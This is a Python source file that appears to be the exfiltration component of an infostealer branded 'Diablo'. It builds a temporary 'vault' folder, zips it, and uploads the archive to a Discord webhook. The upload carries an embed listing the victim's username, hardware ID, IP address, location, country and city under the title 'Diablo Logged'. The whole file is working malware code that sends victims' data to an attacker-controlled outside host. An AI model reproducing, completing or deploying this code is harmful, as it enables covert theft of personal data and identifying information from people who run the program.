import os , uuid
from shutil import make_archive , rmtree
from discord import Embed, File, SyncWebhook

TEMP = os.getenv('temp')

V_NAME = str (uuid.uuid4())

V_PATH = os.path.join(TEMP , V_NAME)

V_PATH_ZIP = os.path.join(TEMP , f'{V_NAME}.zip')


class Vault:


    @staticmethod

    def init():

        if os.path.isdir(V_PATH):

            os.rmdir(V_PATH)

        
        os.mkdir(V_PATH)


        if os.path.isfile(V_PATH_ZIP):

            os.remove(V_PATH_ZIP)


    @staticmethod
    def clean():


        if os.path.isdir(V_PATH):

            rmtree(V_PATH)
        
        if os.path.isfile(V_PATH_ZIP):

            os.remove(V_PATH_ZIP)

    

    @staticmethod

    def zip_vault():

        make_archive(base_name=V_PATH , root_dir=V_PATH , format='zip')
    


    @staticmethod

    def send_full_vault_with_data(WEBHOOK_STR : str , data):

        webhook = SyncWebhook.from_url(WEBHOOK_STR)

        hwid , ip , loc , country , city = data['hwid'] , data['ip'] , data['loc'] , data['country'] , data['city']

    
        vault_file = File(V_PATH_ZIP)

        name = os.getenv('USERNAME')


        webhook.send(
            embeds = [ Embed (
                title = 'Diablo Logged {}!'.format(name),
                description = f'## Log Summary\n - ``Name`` : ``{name}``\n - ``Hwid`` : ``{hwid}``\n - ``IP`` : ``{ip}``\n - ``Location`` : ``{loc}``\n - ``Country`` : ``{country}``\n - ``City`` : ``{city}``',
                color = 0xff5512,
            ), ],
            username = 'Diablo',
            file = vault_file
        )






